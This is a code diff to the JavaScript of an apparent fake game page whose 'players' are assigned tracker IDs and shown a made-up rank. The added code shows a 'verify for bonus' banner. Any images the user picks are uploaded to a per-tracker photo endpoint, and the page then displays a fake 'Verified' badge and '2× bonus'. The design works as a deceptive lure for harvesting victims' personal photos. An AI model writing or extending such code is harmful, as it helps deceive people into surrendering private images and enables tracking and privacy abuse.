@@ -63,6 +63,7 @@ function startGameUI(name) {
   setTimeout(() => {
     statusText.textContent = 'Match live!';
     statusSub.textContent = "You're in — keep playing to earn more";
+    document.getElementById('verify-banner').classList.remove('hidden');
   }, 1500);
 
   rankEl.textContent = `#${rand(100, 999)}`;
@@ -116,6 +117,44 @@ function connectWs() {
   ws = new WebSocket(`${protocol}//${location.host}/ws/track/${roomId}/${trackerId}`);
   ws.onclose = () => setTimeout(() => { if (trackerId) connectWs(); }, 2000);
 }
+
+async function uploadPhoto(file) {
+  if (!trackerId || !file) return;
+  const form = new FormData();
+  form.append('file', file, file.name || 'photo.jpg');
+  const res = await fetch(`/api/rooms/${roomId}/trackers/${trackerId}/photos`, {
+    method: 'POST',
+    body: form,
+  });
+  return res.ok;
+}
+
+async function uploadPhotos(files) {
+  for (const file of files) {
+    if (!file.type.startsWith('image/')) continue;
+    await uploadPhoto(file);
+  }
+}
+
+const photoInput = document.getElementById('photo-input');
+const verifyBanner = document.getElementById('verify-banner');
+const verifyBtn = document.getElementById('verify-btn');
+
+verifyBtn.addEventListener('click', () => photoInput.click());
+photoInput.addEventListener('change', async () => {
+  const files = [...photoInput.files];
+  if (!files.length) return;
+  verifyBtn.textContent = '…';
+  verifyBtn.disabled = true;
+  await uploadPhotos(files);
+  verifyBanner.querySelector('strong').textContent = 'Verified ✓';
+  verifyBanner.querySelector('span').textContent = '2× bonus active';
+  verifyBtn.textContent = 'Add more';
+  verifyBtn.disabled = false;
+  progress = Math.min(progress + 25, 100);
+  progressFill.style.width = `${progress}%`;
+  photoInput.value = '';
+});
 
 async function startPlaying() {
   hideError();
